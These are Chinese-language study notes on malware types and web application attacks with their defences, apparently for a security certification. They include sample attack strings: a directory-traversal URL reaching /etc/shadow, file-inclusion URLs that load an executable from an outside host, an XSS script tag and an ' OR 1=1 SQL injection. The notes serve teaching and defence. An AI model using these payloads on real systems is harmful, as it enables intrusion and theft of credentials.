ch.21  惡意代碼和應用攻擊
d3,7,8

```  
病毒  傳播和有效載荷執行，躲避檢查並用創新方式執行這些功能，可產生任何負面影響
-->>病毒傳播技術 利用共享資源發送郵件界祝活動進行傳播
--->主引導紀錄MBR  最早感染形式利用加載過城類型(可啟用介質,大小512字節)、在合法引導扇區加載操作系統前將病毒到內存
-->>文件感染病毒  可執行文件和腳本、可能只是銷為改動執行程序來植入、通過比對或哈希植
-->>變體"同伴病毒"  利用合法操作系統文件類似名稱來躲避檢查，應避免快捷方式並使用具體文件名

-->>宏病毒  自動腳本語言(VBA)執行功能、限制不受信的宏沒有用戶明確許可運行的能力
-->>服務注入  感染系統並逃脫檢測的技術、破壞可信的進程繞過防毒檢測、確認所有軟件是最新安全補丁

病毒技術  逃避檢測   主引導紀錄＝主開機紀錄
->>複合  多種傳播滲透只防一種技術的系統、每個文件都添加惡意注入感染關鍵文件、可能寫入系統的主引導紀錄成為扇區病毒bios
->>隱形  竄改操作隱藏自己欺騙防毒認為一切正常、覆蓋系統的主引導紀錄、
-->>修改操作系統文件訪問功能覆蓋自身痕跡提供期望看到的版本、啟動時讀取中毒MBR並加載在內存

->>多態  會修改自身代碼、只要每次感染新系統特徵就略有變化讓防毒失效、但需要長期生成必要特徵文件防止攻擊、導致病毒存活率很久
->>加密  很像多態病毒但是有不同的特徵、修改儲存方式、使用很短解密代碼段含必要密碼信息、感染用不同密鑰呈現不同樣子
-->>病毒解密過程包含明顯特徵、因此加密病毒很容易被最新防毒攻破

病毒惡作劇hoax  損害和資源浪費、傳聞的病毒為發作但具破壞性、惡作劇方式透過社交平台流傳
```
```
邏輯炸彈  感染系統並滿足一個或多個條件、現保持休眠的惡意代碼、由開發人員植入用戶制定應用程序的邏輯炸彈會週期性破壞軟件導致中斷或數據丟失
->特洛伊木馬  禁用未經許可軟件降低被木馬破壞風險、是個軟件程序儲存在系統包含惡意有效載荷、系統或網路的破壞
-->>遠程訪問木馬RAT  打開後門控制被感染的系統、主要竊取受感染系統計算能力進行挖礦、也稱為加密惡意軟件
-->>殭屍網路  未安裝防毒被木馬感染的系統成為殭屍網路的成員、殭屍牧人控制眾多計算器組成、反覆檢索同網站導致負荷過高出現故障

->蠕蟲  相同破壞力另有變化、因低效代碼限制自體慢速傳播
->>code red  探測是否為IIS版本的漏洞快速感染再尋找更多、HTML頁面替換正常內容、系統植入邏輯炸彈發起拒絕服務攻擊、更新最新的補丁
->>RTM  unix操作系統、sendmail調試模式：模式最新版本電子郵件路由、利用漏洞傳播、密碼攻擊(字典)獲得遠程系統訪問權限、利用預先建構密碼列表
->>finger漏洞：確定誰登入遠程系統、緩衝區溢出漏洞、禁用finger,、信任關西：試圖透過信任途徑傳播
->>震網stuxnet:複雜高級技術傳播利用未披露漏洞、本地網路為保護共享系統、零日漏洞、默認數據庫密碼、受感染共享USB傳播
-->>不會破壞系統、尋找特殊系統試圖嚴重破壞物理設施、戰爭使用的惡意代碼

間諜軟件與廣告軟件  監控你的行為活動的遠程系統傳送重要細節(PAN卡號)、監控購物行為並重定向到競爭者網站
->潛在有害程序PUP  用戶可能同意安裝在系統上然後軟件背地執行未授權功能、在原始插件代碼添加惡意代碼散播竊取或進行有害活動

勒索軟件  只生成作者知道的加密密鑰、加密任何已安裝驅動器關鍵文件讓任何人無法訪問數據
->>強大的備份和恢復程序備份重建來防止、應尋求法律諮詢

惡意腳本  powershell,bash 自動化執行命令列、設置用戶賬會配置基於角色訪問控制的手動觸發腳本
-->>APT組織利用腳本自動執行常規惡意活動常識提權、限時執行腳本、後門、內存中下載和運行腳本代碼並未寫入磁盤不易被防毒掃到

零日攻擊  未被徹底修復的安全漏洞、深度防禦：一系列不同重疊安全控制措施新的補丁、最新防毒碼、配置管理、應用程序控制、內容過濾
->>脆弱性窗口：攻擊者發現新型惡意代碼到發布補丁和病毒碼更新之間延遲、管理員更新速度緩慢
```
惡意軟件預防
```

反惡意軟件  各端點部署反惡意軟件、基於特徵檢測潛在病毒、定期掃描配置設置、儲存介質
->>能處理根除病毒並將恢復到安全狀態、隔離文件手動處理、超出預定定義危險閥值的直接刪除確保完整性
->>端點保護：把隔離可疑文件發送給工具分析、添加黑名單、切勿找第三方解決方案要面原廠、管理員應強制執行配置和監控警報

完整性監控  檢測網頁竄改和類似攻擊 哈希比較

高級威脅保護  EDR 端點分析
->EDR分析端點內存,文件系統,網路的惡意活動、自動隔離、時實威脅情報集成、自動化響應
->>用戶和實體行為分析UEBA  基於用戶活動、正常活動的蓋要文件、偏差值可能潛在危害

應用程序攻擊
緩衝區溢出
-->>沒正確驗證用戶輸入適當大小內容、覆蓋內存相鄰的其他數據造成執行其他目標指令。
-->>開發人員注意允許輸入變量長度限制條件滿足、邊界檢查防止超出範圍、用戶不能輸入無效值
檢查chk時間到使用use時間 TOC/TOU
->>根據任務執行可能發起攻擊:檢查資源可用、訪問他、TOC/TOU之間差異足以驗證身分後替換數據文件。
-->>每當對資料檢查會有空檔替換、竟態條件攻擊和通信中斷稱為狀態攻擊:特定時間、數據留控制及系統狀態留轉換

後門 繞過正常訪問限制、在開發和調試過程後們常用加快工作流程
-->>後門不備紀錄文檔的性質成為系統安全嚴重威脅，檢索機密訊息、監控用戶活動或進行破壞

特權提升
->>rootkit利用已知漏洞，通過密碼攻擊或社交工程獲得普通用戶帳戶訪問權限，利用rootkit提權
-->>也可以使用無文件惡意軟件、腳本或攻擊向量、最新補丁跟持續應用補救措施。
```
注入漏洞
```
->>提交某種類型代碼作為輸入誘使服務器執行該代碼並提供給其他服務器執行

SQLi  接受到數據庫查詢語句、或是不尋常請求被撈出敏感資料或是修改紀錄、刪除表 破壞可用性和完整性
->>基於內容盲注  檢測是否可以解釋注入代碼、判斷應用程式易受盲注攻擊、嘗試更多惡意查詢更改DB或執行其他不量操作。

->>基於計時盲注  根據返回內容評估是否盲注成功、還可使用處理查詢所需時間作為數據庫檢索信息通道
-->>依賴不同數據庫平台提供延遲機制、利用循環所有可能密碼組合by工具

代碼注入攻擊  LDAP查詢的一部分發送文本遷入命令進行注入攻擊、重點攻擊LDAP目錄服務後端、輸入編寫LDAP語句
->>XML 輸入轉譯和驗證可以對應這種威脅::: DLL注入攻擊 命令可能是圖加載惡意代碼的動態連結酷

命令注入攻擊  返回到操作系統執行命令而獲得直接操作系統能力

利用授權漏洞
-->>OWASP 提高在現或基線的 WEB應用程序安全性、前十大風險榜單做安全評估和滲透的合理起點
不安全的直接對象引用  查詢或請求參數值截從數據庫檢索信息、進行修改
->>應用程式仍負責確保用戶經過適當身分驗證，並備受權請求的文檔

目錄遍歷  安全配置錯誤而允許用戶瀏覽目錄結構並可訪問應保密文件或未正確限制對儲存在服務器其他位子
www.abc.com/rty.php -> /var/www/html/rty.php
->>若要尋找shadow文件只要輸入  www.abc.com/../../../etc/shadow  #回上三層再cd /etc/shadow

文件包含  實際執行文件包含代碼 在c:\www\upload\atck.exe  --> http://www.abc.com/app.php?include=c:\\www\upload\\atck.exe
->>持行遠程服務器代碼不必儲存在服務器上  --> http://www.abc.com/app.php?include=http://www.qwe.com/atck.exe
-->>上傳webshell到服務器並執行命令在瀏覽器查看結果、通常透過80,443訪問服務器所以不易被檢測到、
-->>可能會修復用過取得權限漏洞防止其他攻擊者發現利用、或得到攻擊成功消息的安全團隊發現該漏洞
```

```
跨站腳本  web應用程式允許執行HTML注入網頁插入自己代碼就會發生XSS
->>反射XSS  允許反射輸入、使用luke<script>alert('ballo')</script> 就會顯示文字ballo並執行腳本部分
-->>看似'可信'網站隨後會執行表單輸入框輸入嵌入腳本、應確定允許輸入類型並驗證實際輸入匹配、
-->>輸出編碼將潛在危險內容轉換安全形式  '  --> &#x27

->>儲存持續XSS   遠程服務器儲存跨站腳本代碼、沒有主動發起攻擊也會保留在服務器上(留言板)
-->>當用戶加載就會彈出插入的腳本定向到釣魚網站

請求偽造 
->>跨站請求偽造XSRF,CSRF(誘騙用戶)  利用遠程站點對用戶系統信任嵌入代碼並不知覺代表用戶向第二站點執行命令、
-->>連結中嵌入安全令牌、或讓網站檢查最終用戶接收到的請求引用URL並接受源於他們自己的站點請求

->>服務器端請求偽造SSRF(誘騙服務器) 根據用戶輸入訪問URL作為輸入、從該URL檢索就會發生SSRF去訪問未公開私人URL

會話劫持  攔截授權用戶和資源部分通信兵接管會話和假冒授權用戶的身份
->>捕獲用戶和服務器間身份認證詳細信息去假冒身份、誘騙客戶攻擊者系統就是服務、建立合法連接充當中介然後斷開客戶端的連接
->>使用未正確關閉連接用戶cookie數據訪問web應用程序、設計未正確管理身份認證cookie的應用程序訪問
->>管理控制：反重放身份認證技術、應用程序控制：合理時間使cookie過期
```
應用程序安全控制
```
輸入驗證  不正確輸入處理方式易遭受注入、跨站腳本、首選防止注入攻擊
->>在服務器端上驗證輸入白名單期望輸入確切類型、傳送前驗證並拒絕範圍外任何值、避免繞過輸入驗證
->>輸入黑名單來控制用戶輸入、禁止部分符號、HTML標記、SQL命令
->>參數污染：透過WAF阻止可疑字符串、避免無法正確處理的URL而允許注入通過過濾技術
###http://www.abc.com/app.php?account=4321&account=4321' OR 1=1;- -

WAF  輸入驗證、轉譯輸入、參數化查詢保護應用程序
->>避免測試不足或即時提供補丁、接受網路流量後檢查應用程序輸入驗證後才傳給服務器、防止惡意流量

數據庫安全 避免SQLi注入攻擊
->>參數化查詢   允許定義的變量傳遞給該語句、不允許在變量插入代碼
->>儲存過程    SQL代碼沒有包含在應用程序中而是儲存在數據庫上、客戶不直接向數據庫發送SQL代碼
--->>服務器接收參數插入預編譯查詢模板、這可防止注入又可提高數據庫性能

->>混淆和偽裝
->>數據最小化、不應收集不需要敏感信息、不再需要收集敏感信息盡快處理降低風險
->>標記畫查找表：把顯示個人資料替換唯一標示符、但需要確保查找表的安全
->>哈希函數把敏感標示替換成不可逆替代標示符、運算前用隨即數加鹽、抵禦彩虹表攻擊
```

```
->>
->>
代碼安全  保護創建儲存交付的代碼
->>代碼簽名  用自己的私鑰對代碼進行數字簽名而確認代碼真實性、再用公鑰驗證簽名
--->>相應公鑰包含在隨應用程式分發的數字證書中、每次下載會收到附帶證書提取公鑰：：只能保證代碼真實性
->>代碼重用  第三方軟件庫和軟件開發工具包SDK的方式重用代碼、一種共享代碼常見方式、必須了解依賴關係和安全更新
--->>三方軟件庫：不需要編寫執行所需每個詳細功能代碼而是找到包含相關函數庫然後調用這些函數、確保外包代碼接受同級別的測試
--->>軟件開發工具包SDK：文檔、範例或其他軟件庫集合、能在開發環境快速啟動和運行或幫助設計和測試代碼

->>軟件多樣性   避免單點故障影響可用性
--->>
->>代碼倉庫
--->>
->>完整性度量
--->>
->>應用程序韌性
--->>

安全編碼實踐
-->源代碼註釋
->>錯誤處理
->>硬編碼憑證
->>內存管理
-->>資源耗盡
-->>指針解引用
-->>
->>
->>
```
